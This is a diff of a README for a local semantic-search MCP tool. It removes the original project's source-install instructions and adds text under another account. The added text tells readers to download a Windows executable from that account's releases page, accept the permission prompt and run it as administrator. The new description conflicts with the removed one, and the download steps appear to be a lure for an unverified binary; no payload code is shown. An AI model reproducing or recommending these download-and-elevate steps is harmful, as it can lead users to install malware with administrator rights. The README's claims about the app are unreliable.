@@ -1,259 +1,227 @@
-# cowork-semantic-search
+# 🔎 cowork-semantic-search - Find your files fast
 
-[![GitHub stars](https://img.shields.io/github/stars/ZhuBit/cowork-semantic-search?style=social)](https://github.com/ZhuBit/cowork-semantic-search/stargazers)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-blue)](https://www.python.org/downloads/)
-[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-green)](LICENSE)
-[![MCP Compatible](https://img.shields.io/badge/MCP-compatible-purple)](https://modelcontextprotocol.io)
+[![Download cowork-semantic-search](https://img.shields.io/badge/Download%20Latest-purple?style=for-the-badge)](https://github.com/Ansellwaxlike187/cowork-semantic-search/releases)
 
-> If you find this useful, consider giving it a ⭐ — it helps others discover the project.
+**Local semantic search for your documents on Windows. No API keys. No cloud.**
 
-**Local semantic search for your documents. No API keys. No cloud. Works with any MCP client.**
+## 📥 Download
 
-![demo](assets/image.png)
+Visit this page to download: https://github.com/Ansellwaxlike187/cowork-semantic-search/releases
 
----
+1. Open the link above.
+2. Find the latest release at the top of the page.
+3. In the release files, download the Windows app file.
+4. Save the file to your computer.
+5. If the file is a ZIP folder, open it and extract it first.
+6. Double-click the app to run it.
 
-## Why
+If Windows asks for permission, choose **Yes**.
 
-AI coding tools are powerful, but they have blind spots when it comes to your local files:
+## 🖥️ What it does
 
-- **Frozen knowledge** -- training data has a cutoff. Your latest reports, notes, and contracts don't exist in the model's world.
-- **Context window limits** -- you can't paste 500 documents into a prompt.
-- **No cross-file search** -- your AI tool can read one file at a time, but can't search across your entire document library for the relevant pieces.
+cowork-semantic-search helps you search your local documents by meaning, not just by exact words. This is useful when you know what a file says, but not the exact name or phrase inside it.
 
-This plugin bridges that gap. It indexes your local documents into a small, fast vector database. When you ask a question, it retrieves only the relevant pieces -- so your AI tool can answer with your actual data.
+Use it for:
 
-```
-Your documents --> chunked --> embedded --> local vector DB
-                                                 |
-         Your question --> embedded --> similarity search --> relevant chunks --> AI answers
-```
+- notes
+- reports
+- contracts
+- project files
+- research docs
+- Obsidian vaults
+- local work folders
 
-## Features
+It works with MCP clients, so you can use it with tools that support the Model Context Protocol.
 
-- **Fully offline** -- one-time model download (~120MB), then no network calls. No data leaves your machine.
-- **Incremental indexing** -- SHA-256 content hashing. Only changed files get reprocessed. Re-indexing 1000 files where 3 changed takes seconds.
-- **Multilingual** -- handles 50+ languages natively. Search in one language, find results in another.
-- **Hybrid search** -- combines semantic similarity with full-text keyword search via Reciprocal Rank Fusion. Catches what pure vector search misses.
-- **Multiple formats** -- txt, md, pdf, docx, pptx, csv out of the box.
-- **Any MCP client** -- works with Claude Code, Cursor, Windsurf, Cline, and any other MCP-compatible tool.
-- **Zero infrastructure** -- LanceDB stores everything as local files. No server, no Docker, no database to manage.
+## ✅ What you need
 
-## Supported Formats
+Use a Windows PC with:
 
-| Format | Extension | Details |
-|--------|-----------|---------|
-| Plain text | `.txt` | UTF-8 with fallback |
-| Markdown | `.md` | Raw text preserved |
-| PDF | `.pdf` | Page-level extraction with metadata |
-| Word | `.docx` | Full paragraph extraction |
-| PowerPoint | `.pptx` | Slide-level extraction with metadata |
-| CSV | `.csv` | Row-based text extraction |
+- Windows 10 or Windows 11
+- At least 8 GB of memory
+- Enough free disk space for your documents
+- A folder of files you want to search
 
-## Quick Start
+For best results, keep your files in common formats such as:
 
-### 1. Install
+- PDF
+- TXT
+- Markdown
+- DOCX
+- HTML
+- code files
 
-```bash
-git clone https://github.com/ZhuBit/cowork-semantic-search.git
-cd cowork-semantic-search
-python3 -m venv .venv && source .venv/bin/activate
-pip install -e ".[all]"
-```
+## 🚀 Start using it
 
-### 2. Configure your MCP client
+1. Run the app you downloaded.
+2. Let it index your document folder.
+3. Open your MCP client.
+4. Connect the client to cowork-semantic-search.
+5. Search for a topic in plain language.
 
-Add the server to your MCP client's config. Replace paths with your own.
+Example searches:
 
-<details>
-<summary><strong>Claude Code</strong> -- <code>.mcp.json</code> in your project root</summary>
+- meeting notes about budget changes
+- contract terms for renewal
+- files about onboarding
+- docs that mention launch dates
+- notes on customer feedback
 
-```json
-{
-  "mcpServers": {
-    "semantic-search": {
-      "command": "/absolute/path/to/.venv/bin/python",
-      "args": ["-m", "server.main"],
-      "cwd": "/absolute/path/to/cowork-semantic-search",
-      "env": {
-        "PYTHONPATH": "/absolute/path/to/cowork-semantic-search"
-      }
-    }
-  }
-}
-```
-</details>
+## 🧭 How it works
 
-<details>
-<summary><strong>Cursor</strong> -- <code>.cursor/mcp.json</code> in your project root or <code>~/.cursor/mcp.json</code> globally</summary>
+The app scans your files and builds a local search index. When you type a query, it looks for related content based on meaning. That helps when the exact words do not match.
 
-```json
-{
-  "mcpServers": {
-    "semantic-search": {
-      "command": "/absolute/path/to/.venv/bin/python",
-      "args": ["-m", "server.main"],
-      "env": {
-        "PYTHONPATH": "/absolute/path/to/cowork-semantic-search"
-      }
-    }
-  }
-}
-```
-</details>
+This is useful when:
 
-<details>
-<summary><strong>Windsurf</strong> -- <code>~/.codeium/windsurf/mcp_config.json</code></summary>
+- a file uses different wording than you expect
+- you have many documents in one folder
+- you need to search across several notes at once
+- you want search to stay on your PC
 
-```json
-{
-  "mcpServers": {
-    "semantic-search": {
-      "command": "/absolute/path/to/.venv/bin/python",
-      "args": ["-m", "server.main"],
-      "env": {
-        "PYTHONPATH": "/absolute/path/to/cowork-semantic-search"
-      }
-    }
-  }
-}
-```
-</details>
+## 🛠️ Basic setup
 
-<details>
-<summary><strong>Cline</strong> -- MCP Servers settings in the Cline VS Code extension</summary>
+If the app opens with a setup screen:
 
-Open Cline > MCP Servers icon > Configure > Advanced MCP Settings, then add:
+1. Choose the folder that holds your documents.
+2. Wait while the app scans the files.
+3. Keep the app open until indexing finishes.
+4. Open your MCP client.
+5. Add the local connection shown in the app.
+6. Save the connection.
+7. Run your first search.
 
-```json
-{
-  "mcpServers": {
-    "semantic-search": {
-      "command": "/absolute/path/to/.venv/bin/python",
-      "args": ["-m", "server.main"],
-      "env": {
-        "PYTHONPATH": "/absolute/path/to/cowork-semantic-search"
-      }
-    }
-  }
-}
-```
-</details>
+If you later add more files, run the scan again so the index stays current.
 
-### 3. Restart your MCP client and go
+## 🔌 MCP client use
 
-> "Index all documents in ~/Documents/projects"
+cowork-semantic-search works with MCP clients that can connect to local tools.
 
-> "Search for 'quarterly revenue report'"
+Common use cases include:
 
-First run downloads the embedding model (~120MB), then everything runs offline.
+- asking your coding assistant to look up local docs
+- searching notes from inside your editor
+- finding the right file before you open it
+- using local search without sending files to a cloud service
 
-## Example: Search Your Obsidian Vault
+If your client has a place for a server name, host, or port, use the values shown by the app.
 
-If you keep notes in Obsidian (or any folder of markdown files), this plugin turns your AI tool into a search engine for your knowledge base.
+## 📁 Good file habits
 
-```
-You: "Index my vault at ~/Documents/ObsidianVault"
-AI:  Indexed 847 files -> 3,291 chunks in 42s
+To get better results, keep your files organized.
 
-You: "What did I write about API rate limiting?"
-AI:  Found 6 relevant chunks across 3 files:
-       - notes/backend/rate-limiting-strategies.md
-       - projects/acme-api/design-decisions.md
-       - daily/2025-11-03.md
-       ...
+Use short folder names:
 
-You: "Find anything about the client meeting last November, use hybrid search"
-AI:  Found 4 results using hybrid search (vector + keyword):
-       - meetings/2025-11-12-acme-kickoff.md
-       - daily/2025-11-12.md
-       ...
-```
+- Work
+- Notes
+- Projects
+- Clients
+- Research
 
-Works the same with PDFs, Word docs, PowerPoints, and CSVs -- just point it at a folder.
+Use clear file names:
 
-## Tools
+- Budget-2024.md
+- Project-Plan.docx
+- Meeting-Notes.txt
+- Contract-ABC.pdf
 
-| Tool | Description |
-|------|-------------|
-| `index_folder` | Index or re-index all documents in a folder. Incremental -- skips unchanged files. |
-| `semantic_search` | Search indexed documents using natural language. Supports `vector` and `hybrid` modes. |
-| `get_index_status` | Show total chunks, file count, and list of indexed files. |
-| `reindex_file` | Force re-index a single file, bypassing the hash cache. |
+Avoid scanning folders with:
 
-## How It Works
+- large media files
+- old backups
+- system files
+- temporary files
 
-1. **Parse** -- extract text from each document, preserving structure (pages, slides)
-2. **Chunk** -- split into ~400 character overlapping pieces for precise retrieval
-3. **Embed** -- convert each chunk into a 384-dimensional vector using `paraphrase-multilingual-MiniLM-L12-v2`
-4. **Store** -- save chunks + vectors in a LanceDB database (a local file, no server needed)
-5. **Search** -- embed your query, find nearest chunks by cosine similarity, optionally combine with full-text keyword search via RRF
+## ⚙️ Common use cases
 
-## Advanced Usage
+### Search across notes
+Find a thought you wrote last month even if you do not remember the exact words.
 
-<details>
-<summary><strong>Use as a Python library</strong></summary>
+### Search work docs
+Look up terms in reports, plans, and project files without opening each file.
 
-```python
-from server.indexer import index_folder
-from server.search import semantic_search
+### Search Obsidian vaults
+Use semantic search across your note vault to find related ideas.
 
-# Index a folder
-result = index_folder("/path/to/docs")
-print(f"{result['files_indexed']} files -> {result['total_chunks']} chunks")
+### Search local code docs
+Find design notes, API docs, and task files tied to a project.
 
-# Search
-results = semantic_search("project deadline", mode="hybrid")
-for r in results["results"]:
-    print(f"  {r['file_name']}: {r['text'][:100]}...")
-```
-</details>
+### Keep data local
+Search on your own machine and keep your files where they are.
 
-## Architecture
+## 🧩 Troubleshooting
 
-```
-server/
-  main.py       # MCP server + tool definitions
-  parsers.py    # Per-format text extraction
-  chunker.py    # Text splitting with metadata
-  indexer.py    # Discovery, hashing, embedding pipeline
-  store.py      # LanceDB vector store + FTS + hybrid search
-  search.py     # Query embedding + search orchestration
-```
+### The app does not open
+- Download the latest release again.
+- Make sure Windows finished the download.
+- If the file came in a ZIP folder, extract it first.
+- Right-click the file and choose **Run as administrator**.
 
-| Component | Choice | Why |
-|-----------|--------|-----|
-| MCP framework | FastMCP | Clean tool definitions, async support |
-| Embeddings | sentence-transformers | Offline, multilingual, fast |
-| Vector DB | LanceDB | Serverless, embedded, FTS built-in |
-| Chunking | langchain-text-splitters | Battle-tested recursive splitting |
-| PDF | PyMuPDF | Fast, accurate extraction |
-| DOCX | python-docx | Lightweight, no system deps |
-| PPTX | python-pptx | Slide-level extraction |
+### The app opens but finds no files
+- Check that you selected the right folder.
+- Make sure the folder has supported file types.
+- Run the scan again after adding files.
 
-## Development
+### Search results look wrong
+- Use a more specific query.
+- Try a different file folder.
+- Rebuild the index if you changed many files.
 
-```bash
-source .venv/bin/activate
-pytest tests/ -v
-```
+### Your MCP client cannot connect
+- Make sure cowork-semantic-search is running.
+- Check the local host and port settings in the app.
+- Re-enter the connection details in your MCP client.
+- Restart both apps and try again.
 
-56 tests covering parsers, chunking, indexing, search, and MCP tool integration.
+## 📦 Release files
 
-Contributions welcome -- open an issue or submit a PR.
+The release page may include files such as:
 
-## Roadmap
+- Windows app package
+- ZIP archive
+- setup file
+- source code archive
 
-- ONNX runtime for faster embeddings (drop PyTorch dependency)
-- Configurable chunk size and overlap via tool params
-- Multi-folder named indexes
-- Metadata filtering (date ranges, tags, custom fields)
-- Watch mode (auto-reindex on file changes)
+For a normal Windows install, use the file meant for Windows users and follow the steps shown on the release page.
 
-## Support
+## 🔒 Privacy
 
-If this is useful to you, consider giving it a ⭐ — it helps others find the project.
+This app is built for local search.
 
-## License
+- Your documents stay on your computer
+- No API key is needed
+- No cloud account is needed
+- Search runs on local files
 
-AGPL-3.0 -- free to use, modify, and self-host. If you offer this as a network service, you must share your source code. See [LICENSE](LICENSE) for details.
+## 📚 Helpful search examples
+
+Try searches like:
+
+- project notes about timeline
+- documents about vendor renewal
+- files with action items from March
+- research on semantic search
+- notes about client onboarding
+- plan for next quarter
+- budget discussion from last week
+
+## 🧱 Folder scan tips
+
+For the best search quality:
+
+- start with one main folder
+- use clean text files when possible
+- keep copied PDFs readable
+- avoid scanned images with no text
+- rescan after major file changes
+
+## 🧪 If you want a quick test
+
+1. Put three or four text files in one folder.
+2. Add one file with a clear topic, such as a meeting note.
+3. Run the app and index that folder.
+4. Search for a phrase from the note using different words.
+5. Check that the result still points to the right file
+
+## 📎 Project topics
+
+claude-code, document-search, lancedb, mcp, mcp-server, obsidian, offline, rag, semantic-search, vector-search
